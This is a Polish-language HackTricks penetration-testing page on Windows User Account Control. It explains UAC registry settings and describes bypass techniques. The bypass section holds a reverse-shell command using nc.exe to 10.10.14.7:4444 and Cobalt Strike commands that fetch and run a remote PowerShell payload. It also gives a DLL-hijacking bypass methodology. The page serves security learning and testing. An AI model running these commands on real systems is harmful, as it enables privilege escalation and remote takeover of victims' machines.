# UAC - User Account Control

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) do łatwego tworzenia i **automatyzacji prac** z wykorzystaniem najbardziej zaawansowanych narzędzi społeczności.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[System Kontroli Konta Użytkownika (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) to funkcja umożliwiająca **zgłoszenie uprawnień do działań zwiększonych**. Aplikacje mają różne poziomy `integralności`, a program o **wysokim poziomie** może wykonywać zadania, które **mogą potencjalnie naruszyć system**. Gdy UAC jest włączone, aplikacje i zadania zawsze **działają w kontekście zabezpieczeń konta niebędącego administratorem**, chyba że administrator wyraźnie autoryzuje te aplikacje/zadania do uzyskania dostępu na poziomie administratora do systemu. Jest to funkcja ułatwiająca, która chroni administratorów przed niezamierzonymi zmianami, ale nie jest uważana za granicę bezpieczeństwa.

Aby uzyskać więcej informacji na temat poziomów integralności:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Gdy UAC jest aktywne, użytkownik administratora otrzymuje 2 tokeny: standardowy klucz użytkownika, aby wykonywać zwykłe czynności na poziomie standardowym, oraz jeden z uprawnieniami administratora.

Ta [strona](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) omawia w szczegółach, jak działa UAC, i obejmuje proces logowania, doświadczenie użytkownika oraz architekturę UAC. Administratorzy mogą używać zasad bezpieczeństwa do konfigurowania sposobu działania UAC specyficznego dla swojej organizacji na poziomie lokalnym (za pomocą secpol.msc) lub skonfigurować i wdrożyć za pomocą obiektów zasad grupy (GPO) w środowisku domeny Active Directory. Różne ustawienia są omówione szczegółowo [tutaj](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Istnieje 10 ustawień zasad grupy, które można ustawić dla UAC. Poniższa tabela zawiera dodatkowe szczegóły:

| Ustawienie zasad grupy                                                                                                                                                                                                                                                                                                                                                           | Klucz rejestru               | Ustawienie domyślne                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Konto użytkownika Kontroli: Tryb zatwierdzania administratora dla wbudowanego konta Administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Wyłączone                                                     |
| [Konto użytkownika Kontroli: Zezwalaj aplikacjom UIAccess na wywoływanie zgłoszeń o podniesienie uprawnień bez użycia bezpiecznego pulpitu](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Wyłączone                                                     |
| [Konto użytkownika Kontroli: Zachowanie monitu podniesienia uprawnień dla administratorów w trybie zatwierdzania administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Monituj o zgodę dla plików niebędących plikami systemowymi Windows |
| [Konto użytkownika Kontroli: Zachowanie monitu podniesienia uprawnień dla użytkowników standardowych](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Monituj o poświadczenia na bezpiecznym pulpicie                |
| [Konto użytkownika Kontroli: Wykrywaj instalacje aplikacji i wywołuj monit o podniesienie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Włączone (domyślne dla domu) Wyłączone (domyślne dla przedsiębiorstwa) |
| [Konto użytkownika Kontroli: Podnoszenie tylko dla wykonywalnych plików, które są podpisane i zweryfikowane](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Wyłączone                                                     |
| [Konto użytkownika Kontroli: Podnoszenie tylko dla aplikacji UIAccess zainstalowanych w bezpiecznych lokalizacjach](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Włączone                                                      |
| [Konto użytkownika Kontroli: Uruchamiaj wszystkich administratorów w trybie zatwierdzania administratora](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Włączone                                                      |
| [Konto użytkownika Kontroli: Przełącz na bezpieczny pulpit podczas wywoływania monitu o podniesienie uprawnień](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Włączone                                                      |
| [Konto użytkownika Kontroli: Wirtualizuj niepowodzenia zapisu plików i rejestrów do lokalizacji na użytkownika](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Włączone                                                      |
### Teoria bypassowania UAC

Niektóre programy są **automatycznie ustawione na wyższym poziomie uprawnień** jeśli **użytkownik należy** do **grupy administratorów**. Te pliki wykonywalne mają w swoich _**Manifestach**_ opcję _**autoElevate**_ z wartością _**True**_. Plik wykonywalny musi być również **podpisany przez Microsoft**.

Następnie, aby **obejść** **UAC** (podnieść się z poziomu **średniego** do **wysokiego**), niektórzy atakujący używają tego rodzaju plików wykonywalnych do **wykonywania arbitralnego kodu**, ponieważ będzie on wykonywany z procesu o **wysokim poziomie integralności**.

Możesz **sprawdzić** _**Manifest**_ pliku wykonywalnego za pomocą narzędzia _**sigcheck.exe**_ z Sysinternals. A poziom **integralności** procesów można **zobaczyć** za pomocą _Process Explorer_ lub _Process Monitor_ (z Sysinternals).

### Sprawdź UAC

Aby potwierdzić, czy UAC jest włączone, wykonaj:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Jeśli jest to **`1`**, to UAC jest **aktywowane**, jeśli jest to **`0`** lub **nie istnieje**, to UAC jest **nieaktywne**.

Następnie sprawdź, **który poziom** jest skonfigurowany:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Jeśli **`0`**, to UAC nie będzie prosić o zezwolenie (jak **wyłączone**)
* Jeśli **`1`**, administrator jest **proszony o nazwę użytkownika i hasło** do wykonania pliku binarnego z wysokimi uprawnieniami (na Bezpiecznym Pulpicie)
* Jeśli **`2`** (**Zawsze informuj mnie**), UAC zawsze będzie prosić o potwierdzenie dla administratora, gdy próbuje uruchomić coś z wysokimi uprawnieniami (na Bezpiecznym Pulpicie)
* Jeśli **`3`** jak `1`, ale niekoniecznie na Bezpiecznym Pulpicie
* Jeśli **`4`** jak `2`, ale niekoniecznie na Bezpiecznym Pulpicie
* Jeśli **`5`** (**domyślne**) poprosi administratora o potwierdzenie uruchomienia plików binarnych niebędących z systemu Windows z wysokimi uprawnieniami

Następnie należy sprawdzić wartość klucza **`LocalAccountTokenFilterPolicy`**\
Jeśli wartość to **`0`**, to tylko użytkownik RID 500 (**wbudowany Administrator**) może wykonywać zadania administracyjne bez UAC, a jeśli jest `1`, **wszystkie konta w grupie "Administratorzy"** mogą to robić.

Na koniec sprawdź wartość klucza **`FilterAdministratorToken`**\
Jeśli **`0`** (domyślnie), wbudowane konto Administratora może wykonywać zadania administracyjne zdalnie, a jeśli **`1`**, wbudowane konto Administratora **nie może** wykonywać zadań administracyjnych zdalnie, chyba że `LocalAccountTokenFilterPolicy` jest ustawione na `1`.

#### Podsumowanie

* Jeśli `EnableLUA=0` lub **nie istnieje**, **brak UAC dla nikogo**
* Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, Brak UAC dla nikogo**
* Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` oraz `FilterAdministratorToken=0`, Brak UAC dla RID 500 (wbudowany Administrator)**
* Jeśli `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` oraz `FilterAdministratorToken=1`, UAC dla wszystkich**

Wszystkie te informacje można uzyskać za pomocą modułu **metasploit**: `post/windows/gather/win_privs`

Możesz również sprawdzić grupy swojego użytkownika i uzyskać poziom integralności:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

{% hint style="info" %}
Należy zauważyć, że jeśli masz dostęp do interfejsu graficznego ofiary, pominięcie UAC jest proste, ponieważ możesz po prostu kliknąć "Tak", gdy pojawi się monit UAC.
{% endhint %}

Pominięcie UAC jest konieczne w następującej sytuacji: **UAC jest aktywowane, Twój proces działa w kontekście średniej integralności, a Twoje konto należy do grupy administratorów**.

Warto zaznaczyć, że **znacznie trudniej jest ominąć UAC, jeśli jest ustawiony na najwyższym poziomie zabezpieczeń (Zawsze), niż gdy jest ustawiony na którymkolwiek z innych poziomów (Domyślnie).**

### UAC wyłączone

Jeśli UAC jest już wyłączone (`ConsentPromptBehaviorAdmin` to **`0`**), możesz **wykonać odwróconą powłokę z uprawnieniami administratora** (wysoki poziom integralności) używając na przykład:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass za pomocą duplikacji tokena

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Bardzo podstawowe "omijanie" UAC (pełny dostęp do systemu plików)

Jeśli masz powłokę z użytkownikiem należącym do grupy Administratorów, możesz **zamontować udział C$** za pomocą SMB (system plików) lokalnie na nowym dysku i będziesz miał **dostęp do wszystkiego w systemie plików** (nawet do folderu domowego Administratora).

{% hint style="warning" %}
**Wygląda na to, że ten trik już nie działa**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass z Cobalt Strike

Techniki Cobalt Strike będą działać tylko wtedy, gdy UAC nie jest ustawione na maksymalnym poziomie zabezpieczeń.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** mają również kilka modułów do **omijania** **UAC**.

### KRBUACBypass

Dokumentacja i narzędzie dostępne pod adresem [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Wykorzystania do omijania UAC

[**UACME**](https://github.com/hfiref0x/UACME) to **kompilacja** kilku wykorzystań do omijania UAC. Zauważ, że będziesz musiał **skompilować UACME za pomocą Visual Studio lub msbuild**. Kompilacja stworzy kilka plików wykonywalnych (np. `Source\Akagi\outout\x64\Debug\Akagi.exe`), będziesz musiał wiedzieć, **który z nich potrzebujesz.**\
Powinieneś **być ostrożny**, ponieważ niektóre omijania spowodują **wyświetlenie komunikatu przez inne programy**, które **powiadomią użytkownika**, że coś się dzieje.

UACME zawiera **wersję kompilacji, od której zaczęła działać każda technika**. Możesz wyszukać technikę wpływającą na twoje wersje:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### Więcej bypass UAC

**Wszystkie** techniki używane tutaj do bypassowania UAC **wymagają** pełnej interaktywnej powłoki z ofiarą (zwykła powłoka nc.exe nie wystarczy).

Możesz uzyskać sesję **meterpreter**. Przejdź do **procesu**, który ma wartość **Session** równą **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ powinien działać)

### Bypass UAC z interfejsem graficznym

Jeśli masz dostęp do **interfejsu graficznego, możesz po prostu zaakceptować monit UAC**, gdy się pojawi, nie potrzebujesz go omijać. Dlatego uzyskanie dostępu do interfejsu graficznego pozwoli Ci ominąć UAC.

Co więcej, jeśli uzyskasz sesję interfejsu graficznego, którą ktoś używał (potencjalnie za pośrednictwem RDP), istnieją **narzędzia, które będą działać jako administrator**, z których można **uruchomić** na przykład **cmd** jako administratora bez ponownego pytania o UAC, takie jak [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Może to być trochę bardziej **skryte**.

### Głośny bypass UAC metodą brutalnej siły

Jeśli nie zależy Ci na dyskrecji, zawsze możesz **uruchomić coś w stylu** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), które **wymaga podniesienia uprawnień, dopóki użytkownik ich nie zaakceptuje**.

### Twój własny bypass - Podstawowa metodologia bypassowania UAC

Jeśli spojrzysz na **UACME**, zauważysz, że **większość bypassów UAC wykorzystuje podatność na Dll Hijacking** (głównie poprzez zapisanie złośliwej dll w _C:\Windows\System32_). [Przeczytaj to, aby dowiedzieć się, jak znaleźć podatność na Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Znajdź binarny plik, który **automatycznie podnosi uprawnienia** (sprawdź, czy po uruchomieniu działa na wysokim poziomie integralności).
2. Za pomocą procmon znajdź zdarzenia "**NAME NOT FOUND**", które mogą być podatne na **DLL Hijacking**.
3. Prawdopodobnie będziesz musiał **zapisać** plik DLL w **chronionych ścieżkach** (np. C:\Windows\System32), gdzie nie masz uprawnień do zapisu. Możesz to ominąć, używając:
1. **wusa.exe**: Windows 7, 8 i 8.1. Pozwala na wypakowanie zawartości pliku CAB w chronionych ścieżkach (ponieważ to narzędzie jest uruchamiane na wysokim poziomie integralności).
2. **IFileOperation**: Windows 10.
4. Przygotuj **skrypt**, aby skopiować swoje DLL do chronionej ścieżki i uruchomić podatny i automatycznie podniesiony binarny plik.

### Inna technika bypassowania UAC

Polega na obserwowaniu, czy **binarny plik autoElevated** próbuje **odczytać** z **rejestru** **nazwę/ścieżkę** **binarnego** pliku lub **polecenie** do **wykonania** (to jest bardziej interesujące, jeśli binarny plik wyszukuje te informacje wewnątrz **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować przepływy pracy** zasilane przez najbardziej zaawansowane narzędzia społecznościowe na świecie.\
Zdobądź dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
